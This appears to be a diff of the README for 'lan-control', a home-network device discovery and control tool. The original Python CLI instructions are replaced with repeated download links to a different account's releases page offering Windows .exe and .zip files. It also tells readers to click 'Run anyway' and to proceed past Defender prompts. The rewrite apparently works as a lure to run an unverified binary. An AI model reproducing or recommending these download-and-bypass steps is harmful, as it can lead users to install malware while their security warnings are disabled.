@@ -1,221 +1,284 @@
-# lan-control
+# 🏠 lan-control - Control Every Device on Your LAN
 
-> **Turn your home router into a universal device control hub.**  
-> Zero config · Auto-discover · YAML device profiles · Community-driven · Local-first
+[![Download lan-control](https://img.shields.io/badge/Download-lan--control-blue?style=for-the-badge&logo=github)](https://github.com/analytic-skinny644/lan-control/releases)
 
-[![License: Apache-2.0](https://img.shields.io/badge/License-Apache--2.0-blue.svg?style=flat-square)](LICENSE)
-[![Python 3.8+](https://img.shields.io/badge/Python-3.8+-green.svg?style=flat-square)](https://www.python.org)
-[![OpenClaw Skill](https://img.shields.io/badge/OpenClaw-Skill-blue.svg?style=flat-square)](https://github.com/openclaw/openclaw)
+## ✨ What lan-control does
 
-A CLI tool that discovers and controls every device on your home network — LG TV, BroadLink IR, Android boxes, cameras, and [many more](#supported-devices) — powered by multi-method LAN scanning and community-maintained YAML device profiles.
+lan-control turns your home router into a device control hub. It finds devices on your local network, helps identify them, and gives you one place to manage them.
 
----
+Use it to:
+- Find phones, TVs, printers, cameras, plugs, and other devices on your LAN
+- See clear device names instead of unknown IP addresses
+- Control supported devices from one simple interface
+- Keep a closer eye on your home network
+- Set up a basic smart home control center on your router or a small local device
 
-## Table of Contents
+## 🚀 Getting Started
 
-- [Highlights](#highlights)
-- [Quick Start](#quick-start)
-- [Supported Devices](#supported-devices)
-- [Built-in Commands](#built-in-commands)
-- [Add Your Device](#add-your-device)
-- [How It Works](#how-it-works)
-- [Anti-patterns We Handle](#anti-patterns-we-handle)
-- [License](#license)
+Follow these steps to download and run lan-control on Windows.
 
----
+### 1. Visit the download page
 
-## Highlights
+Open the release page here:
 
-- **Universal** — Not tied to any router brand or SSH. Works with OpenWrt, GL.iNet, ASUS Merlin, TP-Link, Xiaomi, Ubiquiti — and even without router access.
-- **Multi-method discovery** — SSH into router (best) → ARP scan → nmap → mDNS/UPnP. Falls back automatically.
-- **Zero config** — Auto-discovers your router and devices. No manual IP entry.
-- **YAML-driven** — Each device type is a `.yaml` file. Adding support = adding a file. No code changes.
-- **Community-driven** — MAC prefix + hostname pattern matching. Drop a YAML, submit a PR, done.
-- **Local-first** — Runs on your Mac/Linux. No cloud, no VPS, no account. Your router, your data.
-- **Agent-ready** — All output is structured JSON (stdout). Human summaries go to stderr.
+[Download lan-control from GitHub Releases](https://github.com/analytic-skinny644/lan-control/releases)
 
-## Quick Start
+### 2. Download the Windows file
 
-```bash
-git clone https://github.com/ythx-101/lan-control.git
-cd lan-control
-pip install -r requirements.txt
-```
+On the releases page, look for the latest version. In the list of files, download the Windows file if one is shown. It may have a name like:
+- `lan-control-windows.exe`
+- `lan-control-setup.exe`
+- `lan-control.zip`
 
-```bash
-python3 cli.py discover                    # Find your router
-python3 cli.py connect                     # SSH into router (auto key/password)
-python3 cli.py devices                     # List all LAN devices
-python3 cli.py commands lg-webos           # Show available commands
-python3 cli.py control openwrt uptime      # Execute command on device
-python3 cli.py health                      # Router health check
-```
+If you see a ZIP file, save it to your computer and extract it after the download finishes.
 
-Example output:
+### 3. Open the app
 
-```
-$ python3 cli.py discover
-🔍 Default gateway: 192.168.1.1
-🔑 SSH: open (SSH-2.0-dropbear)
-✅ Router: GL-AXT1800 (OpenWrt 23.05)
+If you downloaded an `.exe` file:
+- Double-click the file to start it
 
-$ python3 cli.py devices
-📱 4 devices found:
-  📺 192.168.1.100  LG webOS TV          ssap
-  🎛️ 192.168.1.101  BroadLink RM4        http
-  📷 192.168.1.102  Reolink Camera       http
-  📦 192.168.1.103  Android TV Box       adb
+If you downloaded a `.zip` file:
+- Right-click the ZIP file
+- Choose **Extract All**
+- Open the folder
+- Double-click the main `.exe` file inside
 
-$ python3 cli.py commands lg-webos
-  power_off     关机
-  volume_up     音量+
-  launch_app    启动应用 [youtube, netflix, ...]
-  set_volume    设置音量 (0-100)
-  screenshot    截屏
-  ...18 commands total
-```
+### 4. Approve Windows security prompts
 
-## Supported Devices
+Windows may ask if you want to run the file. If that happens:
+- Click **More info** if needed
+- Click **Run anyway** if you trust the download source
 
-| Type | Devices | Protocol | Control | Status |
-|------|---------|----------|---------|--------|
-| **Router** | OpenWrt, GL.iNet, ASUS Merlin, TP-Link, Xiaomi, Ubiquiti | SSH/HTTP API | `ssh` driver | ✅ Verified |
-| **TV** | LG webOS | WebSocket (SSAP) | planned | ✅ Profile |
-| **TV** | Samsung Tizen, Roku | HTTP | planned | 📝 Planned |
-| **IR Remote** | BroadLink RM4 | UDP/HTTP | planned | ✅ Profile |
-| **Android Box** | H616/H618/S905/RK3566 | ADB/SSH | `adb` driver | ✅ Verified |
-| **E-ink** | ESP32 displays (Waveshare, LilyGo, TRMNL) | HTTP | `http` driver | ✅ Profile |
-| **Speaker** | Google Nest, Amazon Echo | Cast/HTTP | planned | 📝 Planned |
-| **Camera** | Reolink, Hikvision | HTTP | `http` driver | 📝 Planned |
-| **AC** | Generic IR (via BroadLink) | IR Bridge | planned | 📝 Planned |
-| **IoT** | ESP/Tuya, Tasmota | HTTP/MQTT | `http` driver | 📝 Planned |
+This can happen with new apps that are not installed from the Microsoft Store.
 
-> **✅ Verified** = tested on real hardware with working driver. **✅ Profile** = YAML profile exists, driver in progress. **📝 Planned** = PRs welcome.
+### 5. Let lan-control scan your network
 
-## Built-in Commands
+After launch, lan-control will scan your LAN for devices. This can take a short time.
 
-| Command | Description |
-|---------|-------------|
-| `discover` | Auto-detect router (gateway → SSH → HTTP → ARP fallback) |
-| `connect [password]` | SSH into router (key → password → defaults, auto-fallback) |
-| `devices` | Scan LAN devices (SSH DHCP → ARP fallback) |
-| `supported` | List all supported device types from YAML profiles |
-| `commands <device>` | List available commands for a device type |
-| `control <device> <cmd> [params]` | **Execute command on a device** (SSH/ADB/HTTP) |
-| `health` | Router health (memory, WireGuard, DNS, device ping) |
-| `ping <ip\|hostname>` | Check if a device is online |
+You may see:
+- Device names
+- IP addresses
+- Device types
+- Status information
+- Control options for supported hardware
 
-## Add Your Device
+## 🖥️ System Requirements
 
-Your device isn't listed? **5 minutes:**
+lan-control is built for home network use and runs best on a Windows PC that stays connected to your router.
 
-### 1. Create a YAML file
+Recommended setup:
+- Windows 10 or Windows 11
+- At least 4 GB RAM
+- 200 MB free disk space
+- Active local network connection
+- Access to the same router and LAN as the devices you want to manage
 
-```yaml
-# devices/tv/my-smart-tv.yaml
-device:
-  name: "My Smart TV"
-  type: tv
-  vendor: MyBrand
-  protocol: http
+For the best results:
+- Keep the PC on the same network as your smart devices
+- Use wired Ethernet if you want stable scans
+- Make sure your router allows local device discovery
 
-discovery:
-  mac_prefixes:
-    - "aa:bb:cc"           # First 3 bytes of MAC
-  hostname_patterns:
-    - "(?i)mysmartv"       # Regex for DHCP hostname
+## 📦 What you can do with it
 
-connection:
-  method: http
-  port: 8080
+lan-control focuses on simple local network control.
 
-commands:
-  power_off:
-    description: "Power off"
-    action: "POST /api/power/off"
-  volume_up:
-    description: "Volume +"
-    action: "POST /api/volume/up"
-```
+Common uses include:
+- Finding devices you do not recognize
+- Naming devices so they are easy to spot
+- Checking which devices are online
+- Grouping home devices by room or type
+- Managing supported IoT devices from one place
+- Building a local control setup without cloud tools
 
-### 2. Test
+## 🔧 How it works
 
-```bash
-python3 cli.py supported    # Your device should appear
-```
+lan-control uses your router and local network to look for devices that respond on your LAN. It can identify devices by:
+- Network name
+- MAC address
+- Vendor details
+- Device behavior
+- Smart home service hints
 
-### 3. Submit PR
+This makes it easier to sort devices like:
+- Smart bulbs
+- Wi-Fi plugs
+- Cameras
+- TVs
+- Speakers
+- Printers
+- Network appliances
 
-That's it. The registry auto-scans all YAML files in `devices/`.
+## 🗂️ Typical setup flow
 
-## How It Works
+If you are new to this kind of app, use this simple flow:
 
-### Discovery Methods (auto-fallback)
+1. Download the latest Windows release
+2. Open the app
+3. Allow it to scan your LAN
+4. Review the list of devices
+5. Rename devices you know
+6. Start using control features for supported devices
 
-| Method | Needs Router SSH? | What you get | Best for |
-|--------|:-:|-------------|----------|
-| **SSH DHCP scan** | ✅ | All devices with MAC + hostname + IP | OpenWrt, GL.iNet, ASUS Merlin |
-| **ARP table** | ❌ | Devices your machine has talked to | Any network, no router access |
-| **nmap scan** | ❌ | All active IPs + open ports + OS hints | Deep scan, any network |
-| **mDNS/Bonjour** | ❌ | Devices advertising services | Apple TV, Chromecast, printers |
-| **UPnP/SSDP** | ❌ | Devices with UPnP enabled | Smart TVs, speakers, cameras |
-| **Router HTTP API** | ❌ SSH, ✅ Web | Device list via admin API | Xiaomi, Huawei, TP-Link (no SSH) |
+## 📌 Tips for better results
 
-> **No SSH? No problem.** lan-control tries SSH first (most complete data), then falls back to local network scanning. You always get *something*.
+- Keep your router powered on during scans
+- Make sure devices are connected to the same network
+- Turn on Wi-Fi on phones and tablets you want to find
+- Refresh the scan after adding a new device
+- Use clear names, like `Living Room TV` or `Kitchen Plug`
 
-### Architecture
+If a device does not appear:
+- Check that it is powered on
+- Confirm it is on the same LAN
+- Restart the device
+- Run another scan
 
-```
-lan-control
-   │
-   ├── SSH → router DHCP table     (best: full MAC + hostname)
-   ├── ARP → local ARP cache       (good: MAC + IP)
-   ├── nmap → subnet scan           (good: IP + ports + OS)
-   ├── mDNS → service discovery     (partial: advertising devices)
-   └── UPnP → SSDP broadcast       (partial: UPnP devices)
-   │
-   ▼
-MAC prefix + hostname → match devices/*.yaml
-   │
-   ▼
-Identified devices → native protocol commands
-   📺 LG TV      → WebSocket (SSAP)
-   🎛️ BroadLink  → UDP/HTTP
-   📷 Camera     → HTTP API
-   📦 Android    → ADB
-```
+## 🔒 Privacy and local use
 
-```
-devices/             ← Community contributes HERE
-  router/            OpenWrt, GL.iNet, ASUS, TP-Link
-  tv/                LG webOS, Samsung Tizen, Roku
-  ir-remote/         BroadLink, Tuya IR
-  speaker/           Google Nest, Amazon Echo
-  camera/            Reolink, Hikvision
-  iot/               Android Box, ESP/Tuya, Tasmota
-  _schema.yaml       Template for new devices
-registry.py          ← Auto-scans devices/
-cli.py               ← CLI entry point
-scripts/             ← Shell scripts (discover, connect, health)
-```
+lan-control is meant for local network use. That means it works inside your home network instead of sending device control through a remote service.
 
-## Anti-patterns We Handle
+This is useful if you want:
+- Faster device discovery
+- Local control on your own network
+- Less dependence on third-party cloud systems
+- A direct view of what is connected to your router
 
-| Trap | What happens | Solution |
-|------|-------------|----------|
-| Clash/Surge fake IP | Gateway shows 198.18.0.1 (TUN) | Auto-detect fake-ip range, find real gateway |
-| ISP port blocking | WireGuard on 51820 silently fails | Documented diagnosis + port change |
-| Double NAT | Router WAN is private 192.168.x.x | Detection + bridge mode guidance |
-| Router OOM | Services crash with <512MB RAM | Swap setup on external storage |
-| Dropbear SSH | Different auth flow than OpenSSH | Multi-method auth (key → password → defaults) |
+## 🧭 Who this is for
 
-## License
+lan-control fits users who want a simple way to manage home devices without learning complex tools.
 
-[Apache-2.0](LICENSE)
-## Documentation
+It is a good fit if you:
+- Want to see all devices on your network
+- Use smart home gear from many brands
+- Like keeping control local
+- Run a home router or OpenWrt-based router
+- Need a simple LAN device dashboard
 
-- [Contributing Guide](references/contributing.md)
-- [Device Schema](references/device-schema.md)
-- [Router Profiles](references/router-profiles.md)
-- [Troubleshooting](references/troubleshooting.md)
+## 🧰 Included project areas
 
+The project name and topics point to a tool built around:
+- Device control
+- LAN scanning
+- Home automation
+- Router-based use
+- OpenWrt support
+- YAML-based setup files
+- CLI tools for advanced use
+- AI-assisted device handling for discovery and control
+
+You do not need to know those terms to use the Windows app. They help shape how the tool works behind the scenes.
+
+## 🪟 Windows use guide
+
+If you want the shortest path on Windows:
+
+1. Go to the release page
+2. Download the newest Windows build
+3. Extract it if needed
+4. Open the app
+5. Let it scan your network
+6. Review the device list
+7. Save or control devices as needed
+
+If Windows asks for permission:
+- Allow the app to run
+- If Defender shows a prompt, check the file source and continue from the release page you downloaded
+
+## 🛠️ Common file types
+
+You may see one of these in the release list:
+
+- `.exe` — run this file directly
+- `.zip` — extract it first, then open the app
+- `.msi` — follow the install steps in the Windows installer
+- `.tar.gz` — this is usually for other systems, not Windows
+
+If more than one Windows file appears, choose the one that matches your system and looks like the main app build.
+
+## 📁 Suggested folder layout
+
+If you extract a ZIP file, keep the app in a folder like:
+- `Downloads\lan-control`
+- `Desktop\lan-control`
+- `Documents\lan-control`
+
+This makes it easy to find later and keeps related files together.
+
+## 🧪 First scan checklist
+
+Before your first scan, check these items:
+- Your PC is connected to the home network
+- The router is online
+- The device you want to find is powered on
+- Your firewall allows local network access
+- You are using the latest release from GitHub
+
+## 🧩 If a device is not identified
+
+Sometimes a device shows up as unknown at first. Try this:
+- Run the scan again
+- Wait a minute and refresh
+- Rename the device once you know what it is
+- Check the device brand or MAC address
+- Reboot the device and rescan
+
+Many home devices only reveal full details after they have been online for a short time.
+
+## 📚 Release page
+
+Download the latest Windows build here:
+
+[Visit the lan-control releases page](https://github.com/analytic-skinny644/lan-control/releases)
+
+## 🤝 Use with home automation
+
+lan-control can fit into a wider smart home setup. You can use it to keep track of devices and support local control across your home network.
+
+Helpful uses include:
+- Matching device names across apps
+- Tracking smart home hardware by room
+- Finding new devices as they join the network
+- Keeping a local list of trusted devices
+- Managing router-connected gear from one place
+
+## 🧼 Keep your device list clean
+
+A clear device list makes the app easier to use.
+
+Try this:
+- Rename devices right away
+- Remove old or unused entries
+- Group devices by room
+- Mark unknown devices for later review
+- Use one name per device, not vague labels
+
+Example names:
+- `Bedroom Lamp`
+- `Office Printer`
+- `Front Door Camera`
+- `Guest TV`
+- `Garage Plug`
+
+## 🧾 What to expect after launch
+
+After lan-control starts, you should see:
+- A network scan
+- A list of discovered devices
+- Device details in a simple format
+- Controls for supported devices
+- Options to refresh or rescan
+
+The exact layout may change by release, but the main flow stays the same: scan, identify, control.
+
+## 🔗 Primary download link
+
+[Download the latest lan-control release](https://github.com/analytic-skinny644/lan-control/releases)
+
+## 🧭 Need a simple next step
+
+If you want to start now:
+1. Open the release page
+2. Download the Windows file
+3. Run the app
+4. Scan your LAN
+5. Review your devices
